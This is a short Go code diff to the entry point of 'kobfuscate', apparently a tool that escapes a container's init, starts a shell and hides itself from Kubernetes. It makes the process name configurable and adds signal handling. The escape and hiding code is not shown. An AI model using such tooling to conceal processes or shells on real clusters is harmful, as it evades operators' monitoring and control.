@@ -19,6 +19,8 @@ package main
 import (
 	"fmt"
 	"os"
+	"os/signal"
+	"syscall"
 	"time"
 
 	"github.com/kris-nova/kush"
@@ -91,22 +93,29 @@ func main() {
 			} else {
 				logrus.SetLevel(logrus.InfoLevel)
 			}
-			logrus.Infof("Starting kobfuscate...")
+			logrus.Infof("Starting kobfuscate with name: %s", cfg.name)
 
 			// By default, this system will do everything
 			// it can to start a ksh shell!
 
-			runtime := kobfuscate.NewRuntime("kush")
-			logrus.Infof("Starting runtime...")
+			runtime := kobfuscate.NewRuntime(cfg.name)
 			err := runtime.EscapeInit()
 			if err != nil {
 				return fmt.Errorf("error initializing: %v", err)
 			}
-			err = runtime.Hide()
-			if err != nil {
-				return fmt.Errorf("unable to obfuscate from Kubernetes: %v", err)
-			}
-			return fmt.Errorf("unable to obfuscate from Kubernetes")
+			go func() {
+				err = runtime.Hide()
+				if err != nil {
+					logrus.Errorf("unable to obfuscate from Kubernetes: %v", err)
+				}
+			}()
+
+			// Signal handler
+			signalChan := make(chan os.Signal, 1)
+			signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM, syscall.SIGQUIT)
+			<-signalChan
+			runtime.Close()
+			return nil
 		},
 	}
 
